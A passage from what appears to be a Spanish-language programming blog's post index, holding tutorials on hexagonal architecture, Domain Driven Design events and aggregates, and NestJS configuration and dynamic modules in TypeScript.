Promise&lt;User&gt;;}Definición de adaptadores de dominio:En nuestro caso el puerto UserRepository será solo una implementación en memoria para simplificar el ejemploexport class InMemoryUserRepository implements UserRepository { constructor(private users: User[]) { } async save(user: User): Promise&lt;void&gt; { this.users.push(user) } findByUsernameStartWith(username: string): Promise&lt;User[]&gt; { const results = this.users.filter(user =&gt; user.username.getValue().startsWith(username)) return Promise.resolve(results) }}Definición de servicios de dominio:UniqueUsernameGeneratorService se encarga de generar el nombre de usuario de acuerdo a las políticas de nuestro fantasioso caso de uso.export class UniqueUsernameGeneratorService implements UniqueUsernameGenerator { constructor(private repository: UserRepository) { } async generate(firstname: string, lastname: string): Promise&lt;Username&gt; { const usernamebase = Username.createUsernameBase(firstname, lastname) const users = await this.repository.findByUsernameStartWith(usernamebase) if (users.length &gt; 1) { const identity = users.length + 1 return Username.createWithIdentity(firstname, lastname, identity) } return Username.create(firstname, lastname) }}4 - Servicios de aplicación implementación de caso de usoEn la implementación de nuestro caso de uso hacemos inyección de los puertos UserRepository y el servicio de dominio UniqueUsernameGeneratorexport class CreateUserService implements CreateUser { constructor( private repository: UserRepository, private uniqueUsernameGenerator: UniqueUsernameGenerator, ) { } async create(createuser: CreateUserDto): Promise&lt;void&gt; { const username = await this.uniqueUsernameGenerator.generate(createuser.firstname, createuser.lastname) const user = User.create({ username: username, email: createuser.email }) return this.repository.save(user) }}Para completar nuestro caso de uso debemos implementar el envío del correo electrónico notificando la creación de usuario, pero en esta ocasión implementaremos un nuevo concepto de Domain Driven Design. Este caso de uso puede ser divido en 2: Crear usuario Notificar usuario por correoEn un enfoque tradicional implementaríamos un servicio y al crear el usuario invocaríamos este componente mediante la coordinación de nuestro servicio de aplicación en ciertos escenarios esto nos bastaría, pero como nuestro sistema es algo mas ligado a un proceso de negocio es mejor pensar en un enfoque más desacoplado. Para lograrlo implementaremos Eventos de Dominio.5 - Eventos de DominioComo su nombre lo indica estos son sucesos que han ocurrido en el dominio se describen en verbo pasado como UserCreated, UserUpdated. Esto nos permite notificar a otros componentes de nuestra aplicación los cambios que han ocurrido en el dominio de forma explícita. Los eventos de dominio nos permite declarar tanto el evento como el subscriptor o manejador del evento de esta manera podemos lograr una aplicación más desacoplada al implementar casos de usos más específicos y con responsabilidad más acotada.Para implementar los eventos de dominio debemos crear un componente llamado EventBus esto es quien coordinara el envío del evento y la distribución de este a los componentes que necesitan realizar una acción determinada. Para crear este EventBus nos basaremos en el patrón de diseño Observer El Patrón de diseño observer nos ofrece la posibilidad de definir una dependencia uno a uno entre dos o más objetos para transmitir todos los cambios de un objeto concreto de la forma más sencilla y rápida posible.Crearemos una clase abstracta llamada EventBase y el tipo EventName. Esta clase declara el método getName() que identificara el tipo de evento a su vez declaramos una segunda clase abstracta llamada DomainEvent haciendo uso de genericos para que el método getData() devuelva de forma tipada los datos que queremos enviar al EventBus.export type EventName = string;export abstract class EventBase { constructor(readonly eventId: string, readonly ocurredOn: Date) { } abstract getName(): EventName;}export abstract class DomainEvent&lt;T&gt; extends EventBase { constructor(private readonly data: T) { super(Id.string(), new Date()) } getData(): T { return this.data }}Ya definido nuestra estructura de eventos debemos hacer cambios en nuestra clase Entity. En domain driven design la idea es que nuestras lógicas de negocio este lo mas cerca de las entidades de nuestro dominio es por eso que User almacenará los eventos relacionados a él.Declararemos un arreglo vacío de EventBase donde iremos almacenando los eventos que pueda producir nuestra entidad User. Acá nuestra clase base nos ayuda a ignorar problemas de tipado cuando tengamos distintos eventos con tipo de data distintos entre sí.Definimos también los siguientes métodos: record(): registra un nuevo evento pullevents(): devolverá todos los eventos y los eliminará de nuestra entidad.export abstract class Entity&lt;T&gt;{ id: Id; private events: EventBase[] = [] abstract equalsTo(entity: T): boolean; record(event: EventBase) { this.events.push(event) } pullEvents() { const domainEvents = this.events.slice(); this.events = []; return domainEvents; }}Ahora debemos generar el evento en el método create() de nuestra entidad User.export class User extends Entity&lt;User&gt; { // Entity props static create(user: CreateNewUserDto): User { const { username, email } = user const id = Id.generate() const userCreated = new this.UserBuilder() .id(id) .username(username) .email(email) .confirmed(false) .build() // generate a domain event userCreated.record( new UserCreated(userCreated) ) return userCreated } // More code...}Finalizamos los cambios sobre nuestra entidad User y declararemos nuestros componentes subscriptores. Creamos una interfaz base EventSubscriber con los siguientes métodos: subscribeTo(): Indicaremos a que evento queremos subscribirnos onEvent(): Acá implementaremos la lógica que queremos realizar cuando llegue un evento de dominio.export interface EventSubscriber { suscribeTo(): EventName; onEvent(event: EventBase): void;}Definimos la siguiente interfaz hija de EventSubscriber esta interfaz sobreescribe el método onEvent() con el parámetro event de tipo DomainEvent el cual nos permite crear un EventSubscriber de forma tipada.export interface DomainEventSubscriber&lt;T&gt; extends EventSubscriber { onEvent(event: DomainEvent&lt;T&gt;): void;}Creamos la interfaz DomainEventBus la cual nos permite agregar subscritores, eliminar subscriptores y enviar eventos de dominio.export interface DomainEventBus { subscribe(subscriber: EventSubscriber): void; unsubscribe(subscriber: EventSubscriber): void; publish(event: EventBase): void;}La implementación de nuestro EventBus será en memoria en este caso no necesitamos más. La lógica más importante se centra en método publish() donde cuando recibe un evento este filtrara a todos los subscriptores que coincidan con en el nombre de evento y notificara el mensaje a los subscriptores correspondientesexport class InMemoryEventBus implements DomainEventBus { private subscribers: EventSubscriber[] = [] subscribe(subscriber: EventSubscriber): void { this.subscribers.push(subscriber) } unsubscribe(subscriber: EventSubscriber): void { const subscriberIndex = this.subscribers.indexOf(subscriber); this.subscribers.splice(subscriberIndex, 1); } publish(event: EventBase): void { this.subscribers .filter(subscriber =&gt; subscriber.suscribeTo() === event.getName()) .forEach(subscriber =&gt; subscriber.onEvent(event)) }}Nuestro patrón observer está terminado nos resta implementar las clases concretas que tendrán la lógica de dominio.Implementamos nuestro evento de dominio donde la data será la misma entidad User, pero puedes enviar los valores que estimes conveniente.export class UserCreated extends DomainEvent&lt;User&gt;{ static EVENT_NAME = 'user-ms.user-created' constructor(user: User) { super(user) } getName(): string { return UserCreated.EVENT_NAME }}Implementamos nuestro caso de uso NotifyUserCreatedByEmail. La lógica no es compleja solo hace uso del puerto EmailService. lo último a tomar en cuenta es devolver el nombre de evento al que queremos suscribirnos en el método suscribeTo().export class NotifyUserCreatedByEmail implements DomainEventSubscriber&lt;User&gt; { constructor(private readonly service: EmailService) { } async onEvent(event: DomainEvent&lt;User&gt;) { const user = event.getData() await this.service.send({ to: user.email, message: `Congratulations your username is ${user.username}. you must to complete the register on ....`, sent: new Date() }) } suscribeTo(): string { return UserCreated.EVENT_NAME }}Nuestro ubscriptor debemos agregarlo al EventBus. Dependiendo del framework que estés usando la estrategia de creación de componentes cambiará en esta ocasión no nos enfocaremos en ese punto:this.eventbus.suscribe( new NotifyUserCreatedByEmail(emailService))Ahora debemos hacer uso de nuestro EventBus en nuestro caso de uso CreateUser y hacer unos pequeños cambios:export class CreateUserService implements CreateUser { constructor( private repository: UserRepository, private uniqueUsernameGenerator: UniqueUsernameGenerator, private eventbus: DomainEventBus ) { } async create(createuser: CreateUserDto): Promise&lt;void&gt; { const username = await this.uniqueUsernameGenerator.generate(createuser.firstname, createuser.lastname) const user = User.create({ username: username, email: createuser.email }) await this.repository.save(user) // pull events and publish user .pullEvents() .forEach(event =&gt; this.eventbus.publish(event)) }}Hemos implementado nuestros casos de uso de una manera totalmente desacoplada sobre una entidad simple. Esto no termina aca, ya que tendremos escenarios donde nuestras entidades estarán compuestas por otras encontrándonos con relaciones uno a muchos, muchos a uno y muchos a muchos. Domain Driven Design nos introduce el concepto de AgregateRoot a esta relación de entidades6 - AggregateRoot y entidades complejasUn Aggregate no es nada más que una agrupación de entidades, value objects y propiedades a simples palabras representa un concepto de negocio que mantiene la coherencia entre sus entidades y objetos. Los agregados son un componente que orquesta todas las operaciones relacionadas con las entidades de forma transaccional para poder mantener su integridad.Para acceder a los valores de nuestro agregado debemos definir una entidad raiz por la que sería como la puerta de entrada de nuestro agregado esto se le conoce como AggregateRoot.Crearemos un AggregateRoot esta tendrá la misma estructura que nuestra clase Entityexport abstract class AggregateRoot&lt;T&gt; { abstract equalsTo(e: T): boolean;}En este ejemplo promoveremos nuestra entidad User a un agregado el cual tendrá los roles que tiene el usuario.export enum Permission { READ = 'READ' EDIT ='EDIT' DELETE ='DELETE'}export class Module extends Entity&lt;Module&gt; { name: string; permissions: Permission[];}export class Role extends Entity&lt;Role&gt; { name: string; modules: Module[]}export class UserId extends Id {}export class User extends AggregateRoot&lt;User&gt; { userId: UserId; username: Username; email: Email; confirmed: boolean; roles: Role[]; private constructor() { super() } static create(user: CreateNewUserDto): User { // code here... } // more code...}Ahora el acceso de las propiedades de nuestro agregado y operaciones con los datos los realizaremos mediante nuestro agregado como podemos apreciar en este caso el agregado no hace nada diferente a lo que haríamos con una entidad. pero si la idea principal es mantener la coherencia entre sus objetosexport class User extends AggregateRoot&lt;User&gt; { userId: UserId; username: Username; email: Email; confirmed: boolean; roles: Role[]; private constructor() { super() } static create(user: CreateNewUserDto): User { // ... code here } addRole(role: Role) { // code here } removeRole(role: Role) { // code here } getModules() { // code here }}Nuestra estructura de carpetas quedaría asi├──  core│ ├──  application│ │ ├──  CreateUser.ts│ │ ├──  event-subscribers│ │ │ └──  NotifyUserCreatedByEmail.ts│ │ └──  services│ │ ├──  CreateUserService.ts│ │ └──  UserCreatorService.spec.ts│ ├──  core.module.ts│ ├──  domain│ │ ├──  events│ │ │ └──  UserCreated.ts│ │ ├──  model│ │ │ ├──  entities│ │ │ │ └──  User.ts│ │ │ └──  valueobjects│ │ │ ├──  Email.spec.ts│ │ │ ├──  Email.ts│ │ │ ├──  Username.spec.ts│ │ │ └──  Username.ts│ │ ├──  ports│ │ │ ├──  inbound│ │ │ │ └──  UniqueUsernameGenerator.ts│ │ │ └──  outbound│ │ │ └──  UserRepository.ts│ │ └──  services│ │ ├──  UniqueUsernameGeneratorService.ts│ │ └──  UsernameGeneratorService.spec.ts│ └──  shared│ ├──  application│ │ └──  ports│ │ └──  outbound│ │ └──  email-service│ │ ├──  EmailMessage.ts│ │ └──  EmailService.ts│ ├──  domain│ │ ├──  AggregateRoot.ts│ │ ├──  DomainEvent.ts│ │ ├──  DomainEventSubscriber.ts│ │ ├──  Entity.ts│ │ ├──  EventBus.ts│ │ ├──  ValueObject.ts│ │ └──  valueobjects│ │ ├──  Id.spec.ts│ │ └──  Id.ts│ ├──  dto│ │ ├──  CreateUserDto.ts│ │ └──  RegisterEmailNotificationDto.ts│ └──  error│ └──  DomainException.ts├──  infraestructure│ ├──  adapters│ │ ├──  in-memory-event-bus.service.ts│ │ ├──  in-memory-user.repository.spec.ts│ │ └──  in-memory-user.repository.ts│ └──  infraestructure.module.tsTenemos cubierto como modelar nuestro dominio pero nuestro dominio debe estar dentro de un contexto definido para representar los caso de uso del negocio.7 - Indentificando Bounded Context de nuestra aplicaciónLos Bounded Context nos da los límites de nuestros modelos para poder separar en los distintos dominios y contextos estableciendo las relaciones necesarias para poder resolver la problemática de nuestro negocio de una manera más modular y adecuado al contexto de lo que está solucionando. Los casos de usos que realizamos para la creación de un usuario podemos englobarlos en un Bounded Context llamado “users” nuestra aplicación después puede integrar otros Bounded Context como puede ser el caso de “user-logs” o “authorization” pero cada uno engloba su propio contexto y si necesitamos que estos Bounded Context se comuniquen podemos realizarlo mediante los eventos de dominio.Para finalizar la estructura de directorios para representar un Bounded Context sería nada más que definir nuestros dominios en forma modular.├──  core│ ├──  auth│ │ ├──  application│ │ ├──  domain│ │ └──  shared│ ├──  shared│ │ ├──  application│ │ └──  domain│ ├──  user-logs│ │ ├──  application│ │ ├──  domain│ │ └──  shared│ └──  users│ ├──  application│ ├──  domain│ └──  shared├──  infraestructure└──  sharedFinalizando los Bounded Context pueden ser una característica del software o puede representar un microservicio.Finalizando con Domain Driven DesignModelamos el dominio de nuestra aplicación con Domain Driven Design espero que este post pueda servirte si quieres emplear clean architectures. Conceptualmente puede abrumarnos ciertos conceptos, pero creo que la decisión de que arquitectura emplear en una solución de software dependerá de que es lo que necesitamos resolver es muy distinto resolver un problema específico del negocio a modelar un proceso entero de negocio que sea vital para la organización. Ten esto en mente para aplicar la arquitectura correcta.Puedes ver los demás artículos de arquitectura hexagonal acá 😉 Arquitectura hexagonal Parte I Arquitectura hexagonal Parte II Arquitectura hexagonal Parte IV Github repositoryMeme de cortesía" }, { "title": "Nestjs tips La versatilidad de ConfigMdule", "url": "/posts/nestjs-tips-la-versatilidad-de-configuration-module/", "categories": "Programacion, Nestjs, Arquitectura de software, Typescript", "tags": "typescript, nestjs, hexagonal", "date": "2022-10-28 12:32:00 -0300", "snippet": "El manejo de credenciales y configuraciones en nuestras aplicaciones es generalmente algo indispensable para los distintos escenarios de desarrollo y despliegue. Algo tedioso a veces, pero nuestro gatuno frameworkNestjs Nos provee de ConfigModule este maravilloso módulo cubre la mayoría de los casos de uso al momento de disponer valores de configuración en nuestra aplicación en esta ocasión les tengo un ejemplo práctico de ConfigModule su inicialización y utilización. ConfigModule es perfecto para mostrar las ventajas de los módulos dinámicos, esta estrategia puede ser utilizada de una manera flexible, no importando donde lo llamemos siempre se comportara igual, pero al momento de registrarlo ahí es donde nosotros definimos que debe hacer, como debe hacerlo y que queremos hacer.Instalación y definición de nuestra ConfigAsumiendo que ya estas trabjando con un proyecto Nestjs instalamos lo siguiente:npm i --save @Nestjs/configAhora lo primero que haremos es crear un archivo de configuración .env con las siguientes variables:# http server SERVER_PORT=3000# northwind databaseDATABASE_HOST=\"localhost\"DATABASE_PORT=5432DATABASE_NAME=\"northwind\"DATABASE_USER=\"northwind\"DATABASE_PASSWORD=\"northwind\" Como tip les recomiento que los nombres sean lo mas descriptivo posible. Por ejemplo SERVER_PORT tiene más contexto que PORT.Ahora crearemos nuestras interfaces que definirán la estructura de nuestras configuraciones y su vez crearemos sus respectivos métodos factoryexport interface DatabaseConfig { host: string; port: number; name: string; user: string; password: string;}export default () =&gt; ({ database: { host: process.env.DATABASE_HOST, port: parseInt(process.env.DATABASE_PORT, 10), name: process.env.DATABASE_NAME, user: process.env.DATABASE_USER, password: process.env.DATABASE_PASSWORD, }});Lo mismo para la configuracion de nuestro server httpexport interface ServerConfig { port: 3000}export default () =&gt; ({ server: { port: parseInt(process.env.SERVER_PORT, 10), }});Ahora registramos nuestro ConfigModule en SharedModule@Module({ imports: [ ConfigModule.forRoot({ isGlobal: true, expandVariables: true, load: [ databaseConfig, serverConfig ], }) ]})export class SharedModule { }Validación y configuración por defectoNuestro módulo ya está listo y puede obtener las variables de entorno sin ningún problema, pero ahora agregaremos una librería para poder realizar validaciones de las variables de entorno.Instalamos joi para generar un esquema de validación.npm install --save joiY agregamos lo siguiente a nuestro SharedModule. Como podemos observar la librería joi nos proporciona una manera simple y declarativa de la estructura de los valores de configuración de nuestra aplicación inclusive nos da la opción de poner valores por defecto@Module({ imports: [ ConfigModule.forRoot({ isGlobal: true, expandVariables: true, load: [ databaseConfig, serverConfig ], validationSchema: Joi.object({ SERVER_PORT: Joi.number().default(3000), DATABASE_HOST: Joi.string().default('localhost'), DATABASE_PORT: Joi.number().default(5432), DATABASE_NAME: Joi.string().required(), DATABASE_USER: Joi.string().required(), DATABASE_PASSWORD: Joi.string().required(), }), validationOptions: { allowUnknown: true, abortEarly: false, }, }) ]})export class SharedModule { }Usando ConfigService para obtener nuestras configuracionesPara obtener las variables de configuración lo hacemos por medio del servicio ConfigService y su método get() podemos obtener los valores inyectando ConfigService en algún servicio definido en nuestra aplicación:@Injectable()export class CustomService{ constructor(private config: ConfigService) {} getHost() { return this.configService.get&lt;string&gt;('database.host') } getDatabaseConfig(){ return this.configService.get&lt;DatabaseConfig&gt;('database') }}También podemos inyectar ConfigService de forma dinámica mediante CustomProviders el cual es nuestro caso.@Module({ imports: [ ConfigModule, TypeOrmModule.forRootAsync({ useFactory: (config: ConfigService) =&gt; { // get specific configuration const database = config.get&lt;DatabaseConfig&gt;('database') return { type: 'postgres', host: database.host, port: database.port, username: database.user, password: database.password, database: database.name, entities: [ ProductEntity, CategoryEntity, SupplierEntity ], synchronize: false, logging: ['query'] } }, inject: [ConfigService], // Injecting ConfigService (nestjs responsability) }) ]})export class NorthwindDatabaseModule { }Finalmente conseguimos una forma limpia y configurable de manejar las configuraciones de nuestra aplicación en este caso hacemos uso de variables de entorno pero dependiendo del caso podemos obtener configuraciones desde archivos o alguna API. La documentación de ConfigModule verás más a detalle como usarlo, pero sin duda esto nos simplifica el desarrollo.Github repositoryConclusiónQue más decir esto fue corto, pero útil a sí que toma un meme de regalo:" }, { "title": "Arquitectura hexagonal Parte II Conectando una clean architecture con Nestjs", "url": "/posts/implementando-hexagonal-con-nestjs-part2/", "categories": "Programacion, Nestjs, Arquitectura de software, Typescript", "tags": "typescript, nestjs, hexagonal", "date": "2022-10-26 12:32:00 -0300", "snippet": "La segunda parte de esta serie de arquitectura hexagonal o (clean architecture) profundizaremos como configurar la interacción de un framework con el core de nuestra arquitectura, Nestjs nos ofrece un diseño adaptable para poder cubrir casos de uso avanzado. La idea es estar lo menos acoplados al framework y que este se adapte a nuestra capa core la cual contienen los casos de uso, las reglas de negocio y las entidades.¿Qué es Nestjs? short answerNestjs es un framework progresivo de NodeJS desarrollado en TypeScript diseñado para facilitar el desarrollo de aplicaciones backend, aportando a los programadores una buena estructura y metodología inicial. Una de sus características es que puedes desarrollar cualquier tipo de proyecto backend, ya que las integraciones están ya disponibles en el framework y solo necesitaras instalar el módulo para poder trabajar, otro punto importante es que sigue la misma arquitectura que angular podemos desarrollar aplicaciones mediante anotaciones, módulos y podemos hacer uso de la inyección de dependencias para crear nuestras clases de servicios,Resumiendo Nestjs es como el spring de Nodejs.Custom providers y módulos dinámicos en NestjsCustom ProvidersUnos de los conceptos principales de nestsjs son los provider que no son nada más que clases de tipo service, objetos o valores que pueden ser inyectados en la aplicación la forma simple es mediante anotaciones, pero como nuestro proyecto necesita ser integrado al framework de una forma limpia emplearemos el uso de custom providers para lograr nuestro objetivo.Módulos dinámicosLos módulos básicamente son una pieza de software que agrupa una capa o una funcionalidad de la aplicación esta contienen controllers, providers y toda pieza de software relacionada con la idea del módulo. Los componentes creados bajo el contexto de Nestjs pueden estar aislados o ser exportadas a otros módulos.En Nestjs puedes crear módulos estáticos en los cuales definimos dependencias, providers y controllers y con esto podras reutilizarlo en otros módulos, pero en escenarios más complejos puedes definirlos de forma dinámica, esta característica nos permite crear fácilmente módulos personalizables que pueden registrar y configurar proveedores de forma dinámica. Justo lo que necesitamos para nuestra aplicación.Manos a la obra integrando nuestra arquitectura hexagonal con NestjsLa estructura de nuestra aplicación actualmente es esta, ya hay definidos unos archivos XXX.module.ts entonces partiremos por configurar el módulo core.├──  core│ ├──  application│ │ ├──  ProductApplication.ts│ │ └──  services│ │ ├──  ProductApplicationService.spec.ts│ │ └──  ProductApplicationService.ts│ ├──  core.module.ts│ ├──  domain│ │ ├──  entities│ │ │ ├──  Category.ts│ │ │ ├──  Product.ts│ │ │ └──  Supplier.ts│ │ ├──  ports│ │ │ ├──  inbound│ │ │ │ ├──  CategoryService.ts│ │ │ │ ├──  ProductService.ts│ │ │ │ └──  SupplierService.ts│ │ │ └──  outbound│ │ │ ├──  CategoryRepository.ts│ │ │ ├──  ProductRepository.ts│ │ │ └──  SupplierRepository.ts│ │ └──  services│ │ ├──  CategoryDomainService.spec.ts│ │ ├──  CategoryDomainService.ts│ │ ├──  ProductDomainService.spec.ts│ │ ├──  ProductDomainService.ts│ │ ├──  SupplierDomainService.spec.ts│ │ └──  SupplierDomainService.ts│ └──  shared│ ├──  dto│ │ └──  NewProductDTO.ts│ └──  error│ ├──  ProductApplicationError.ts│ └──  ProductServiceError.ts├──  infraestructure│ ├──  adapters│ │ ├──  category.repository.adapter.ts│ │ ├──  product.repository.adapter.ts│ │ └──  supplier.repository.adapter.ts│ ├──  http-server│ │ ├──  controllers│ │ │ ├──  product.controller.ts│ │ │ └──  root.controller.ts│ │ ├──  exception-filters│ │ │ └──  product-exception.filter.ts│ │ ├──  http-server.module.ts│ │ ├──  model│ │ │ ├──  app.response.ts│ │ │ └──  create-product.request.ts│ │ └──  utils│ │ └──  generate-swagger-docs.ts│ ├──  infraestructure.module.ts│ ├──  northwind-database│ │ ├──  entities│ │ │ ├──  category.entity.ts│ │ │ ├──  product.entity.ts│ │ │ └──  supplier.entity.ts│ │ └──  northwind-database.module.ts│ └──  shared│ ├──  Log.ts│ └──  shared.module.tsPara crear un módulo dinámico debemos crear un método estático que devolverá un objeto DynamicModule del paquete @Nest/common que básicamente es lo mismo que usar la anotación @Module la cual define las propiedades del módulo la única diferencia es que DynamicModule el parámetro module es obligatorio y hace referencia al mismo módulo. El nombre del módulo register() no es mandatorio por convención los nombres utilizados son forRoot(), forAsyncRoot(), register() y asyncRegister() este método puede ser tanto asíncrono como síncrono.import { DynamicModule, Module, Type } from '@Nestjs/common';@Module({})export class CoreModule { static register(): DynamicModule { return // my awesome module config }}El siguiente paso será definir que parámetros recibirá nuestro método, ya que acá es donde la definiremos la configuración de nuestro módulo. entonces creamos la siguiente interfaceexport type CoreModuleOptions = { modules: Type[]; adapters: { productService: Type&lt;ProductService&gt;; categoryService: Type&lt;CategoryService&gt;; supplierService: Type&lt;SupplierService&gt;; }}La propiedad modules recibirá los módulos dependencias que contendrán los servicios que necesitemos inyectar en nuestro módulo core.Esta interface mediante su porpiedad adapters recibirá las implementaciones de las interfaces ProductService, CategoryService y SupplierService las cuales definimos como puertos en nuestra capa core.Nuestro módulo va tomando esta forma.import { DynamicModule, Module, Type } from '@Nestjs/common';@Module({})export class CoreModule { static register(options: CoreModuleOptions): DynamicModule { const { adapters, modules } = options const { productService, categoryService, supplierService } = adapters return { module: CoreModule, providers: [] } }}Muy bien el próximo paso es definir los providers en este caso necesitamos primero definir los token que son nada más que strings únicos que serán utilizados para identificar que provider queremos inyectardefinimos los siguientes providers:// Application service referenceexport const PRODUCT_APPLICATION = 'PRODUCT_APPLICATION'// domain services referencesexport const CATEGORY_SERVICE = 'CATEGORY_SERVICE'export const PRODUCT_SERVICE = 'PRODUCT_SERVICE'export const SUPPLIER_SERVICE = 'SUPPLIER_SERVICE'Ahora crearemos una objeto que definirá nuestro custom provider este deberá tener las siguientes propiedades: provide: es la clase del provider o un string con el nombre de un servicio el cual Nestjs tendrá que inyectar en donde se solicite su uso, en nuestro caso no vamos a inyectar una clase sino una interfaz, por lo tanto, debemos definir un nombre, ya que en Nestjs para inyectar un valor que no es una clase se necesita definir un Injection token que nada más que un string identificatorio useFactrory: es una función que recibe argumentos y devuelve el objeto que queremos definir como un custom provider los argumentos que recibirá esta función en este caso son los servicios que queremos que Nestjs inyecte a nuestro ProductApplicationService (casos de uso de la entidad productos)y para poder inyectar los servicios que necesita se hace mediante la propiedad inject inject: es un array de proveedores existentes en el módulo los cuales serán los parámetros de la función useFactory()Entonces para crear un Custom Provider para un servicio de dominio será de la siguiente manera:Como nuestro modelo lo indica para crear el servicio de dominio ProductServiceexport class ProductDomainService implements ProductService { constructor(private repository: ProductRepository) {} async save(product: Product): Promise&lt;Product&gt; { if (this.validateProductPrice(product)) { return this.repository.save(product) } throw new ProductServiceError('Product price cannot be negative or equal to zero') } validateProductPrice(product: Product): boolean { return product.unitPrice &gt; 0 }}necesitamos de un ProductRepositoryconstructor(private repository: ProductRepository) {}Donde productRepository proviene del objeto CoreModuleOptions entonces creamos una función ProductServiceProvider donde injectaremos los servicios necesarios para crear nuestro ProductDomainServiceconst ProductServiceProvider = { provide: PRODUCT_SERVICE, // provider token useFactory(repository: ProductRepository) { // return a service instance return new ProductDomainService(repository) }, inject:[ productRepository // get this value from CoreModuleOptions ]}La función useFactory es sencilla solo recibe los providers inyectados por Nestjs que necesitamos y con eso podemos instanciar un Servicio de forma manual pero adecuado a nuestras necesitades.En este otro caso nosotros devolvemos la instancia de una implementacion de la interfaz ProductApplication function useFactory(product: ProductDomainService, category: CategoryDomainService, supplier: SupplierDomainService) { // ProductApplication implementation return new ProductApplicationService(product, category, supplier) }La inyección de nuestro Servicio de applicación será de la siguiente manera con la diferencia que injectamos los token en vez de los adapters que recibiremos:const ProductApplicationProvider = { provide: PRODUCT_APPLICATION, useFactory(product: ProductDomainService, category: CategoryDomainService, supplier: SupplierDomainService) { return new ProductApplicationService(product, category, supplier) }, inject: [ PRODUCT_SERVICE, CATEGORY_SERVICE, SUPPLIER_SERVICE ] }Finalmente nuestro módulo core es el siguiente/** * Options for core module */export type CoreModuleOptions = { modules: Type[]; adapters?: { productRepository: Type&lt;ProductRepository&gt;; categoryRepository: Type&lt;CategoryRepository&gt;; supplierRepository: Type&lt;SupplierRepository&gt;; }}/** * Providers token for netsjs injection */export const PRODUCT_APPLICATION = 'PRODUCT_APPLICATION'export const CATEGORY_SERVICE = 'CATEGORY_SERVICE'export const PRODUCT_SERVICE = 'PRODUCT_SERVICE'export const SUPPLIER_SERVICE = 'SUPPLIER_SERVICE'@Module({})export class CoreModule { static register({ modules, adapters }: CoreModuleOptions): DynamicModule { const { categoryRepository, productRepository, supplierRepository } = adapters /** * ApplicationService Provider * */ const ProductApplicationProvider = { provide: PRODUCT_APPLICATION, useFactory(product: ProductDomainService, category: CategoryDomainService, supplier: SupplierDomainService) { return new ProductApplicationService(product, category, supplier) }, inject: [ PRODUCT_SERVICE, CATEGORY_SERVICE, SUPPLIER_SERVICE ] } /** * DomainService Providers * */ const CategoryServiceProvider = { provide: CATEGORY_SERVICE, useFactory(repository: CategoryRepository) { return new CategoryDomainService(repository) }, inject:[ categoryRepository ] } const SupplierServiceProvider = { provide: PRODUCT_SERVICE, useFactory(repository: ProductRepository) { return new ProductDomainService(repository) }, inject:[ productRepository ] } const ProductServiceProvider = { provide: SUPPLIER_SERVICE, useFactory(repository: SupplierRepository) { return new SupplierDomainService(repository) }, inject:[ supplierRepository ] } return { module: CoreModule, global: true, imports: [ ...modules ], providers: [ ProductApplicationProvider, CategoryServiceProvider, SupplierServiceProvider, ProductServiceProvider ], exports: [ PRODUCT_APPLICATION ], } }}Ahora lo siguiente será registrar a core en la raiz de todos módulos en app.module llamando al método register().CoreModule.register({ modules: [ InfraestructureModule ], adapters: { productRepository: ProductRepositoryAdapter, categoryRepository: CategoryRepositoryAdapter, supplierRepository: SupplierRepositoryAdapter }}),El módulo principal de la aplicación registrará a core y shared` de forma global es decir, estará disponible para todos los módulos que definamos en nuestra aplicación sin necesidad de hacer excesivos imports en nuestras definiciones de módulos.Para lograr esto se hace mediante la propiedad global: true definiendo en el decorador @Module() o en el objeto DynamicModule.@Module({ global: true, ...otherprops})@Module({})export class CoreModule { static register(options: CoreModuleOptions): DynamicModule { // ...ommited return { module: CoreModule, global: true, // other props omitted }}Por último registramos el módulo infraestructure para terminar de conectar todas las capas de nuestra aplicación. El resultado final es el siguiente en AppModule:@Module({ imports: [ InfraestructureModule, SharedModule, CoreModule.register({ modules: [ InfraestructureModule ], adapters: { productRepository: ProductRepositoryAdapter, categoryRepository: CategoryRepositoryAdapter, supplierRepository: SupplierRepositoryAdapter } }), ]})export class AppModule { }Finalmente integramos nuestra arquitectura hexagonal con Nestjs de una manera totalmente desacoplada del framework. La versatilidad de los módulos dinámicos y custom providers nos permiten crear aplicaciones mantenibles y con lógicas desconectadas de frameworks o las librerías de moda. Este mismo enfoque de los módulos dinámicos es una buena práctica al momento de definir grupos de piezas de software que queremos que sean flexibles y configurables de una forma centralizada.Github repositoryPuedes ver los demás artículos de arquitectura hexagonal acá 😉 Arquitectura hexagonal Parte I Arquitectura hexagonal Parte III Arquitectura hexagonal Parte IV ConclusiónNo soy de conclusiones estas siempre van por parte de ti y si intentas poner en práctica lo expuesto podrás tener un concepto más amplio del tema e incluso poder aplicarlo en otros escenarios." }, { "title": "Arquitectura hexagonal con nestjs Parte I", "url": "/posts/implementando-hexagonal-con-nestjs-part1/", "categories": "Programacion, Nestjs, Arquitectura de software, Typescript", "tags": "typescript, nestjs, hexagonal", "date": "2022-10-25 12:32:00 -0300", "snippet": "No voy a profundizar en que es una arquitectura hexagonal, ya que tenemos un montón de recursos que te lo explican de forma detallada, pero ojo que cuando hablamos de este tipo de arquitecturas debemos entender los conceptos principales y no cerrarnos a seguir una pauta al 100%, ya que lo importante acá es definir el dominio de tu lógica de negocio como el núcleo de tu aplicación de todas formas acá la típica explicación más resumida posible porque este post es más código y práctica.¿Qué es la arquitectura hexagonal?Es un tipo de arquitectura de software que busca separar el core lógico de la aplicación (modelo de entidades y casos de uso) y dejarlo en el centro, aislado del exterior y de otras interacciones. Donde las interacciones serán componentes tecnológicos como servicios, bases de datos, UI, APIs, otros sistemas, colas, etc.finalmente para lograr la conexión entre el core de la aplicación con el resto del sistema se realizara mediante puertos y adaptadores donde los puertos son el contrato definido para poder interactuar con el core y los adaptadores son la implementación lógica de estos es decirlos puertos son interfaces y los adaptadores son las implementaciones.Las capas básicas serian las siguientes en esta arquitectura: Domain: son las entidades, reglas de negocio y puertos que definiremos en nuestra aplicación las reglas y funcionalidades pueden estar encapsuladas en servicios de dominio. Application: aca definimos los casos de uso y puertos que necesitemos, esta capa se comunica con domain y hace uso de las reglas, las entidades y los servicios de dominio definidos. Los casos de uso pueden ser encapsulados en servicios de dominio Infraestructure: definimos nuestras implementaciones tecnologías configuraciones del framework, bases de datos, api rest y también acá implementamos la lógica de los adaptadores que se encargaran de comunicar la capa infraestructure con application o con domain¿De verdad nos resulta útil esta arquitectura? ¿o mejor seguimos jugando al programador ninja?Una arquitectura hexagonal es autoexplicativa y define una separación de la lógica de negocio de la implementación tecnológica, para sistemas que sabemos que a futuro necesiten ser escalables y mantenibles, pensar en este tipo de soluciones nos alejara de crear monstruos difíciles de corregir o de mejorar funcionalidades sin que otra parte del sistema falle sin saber 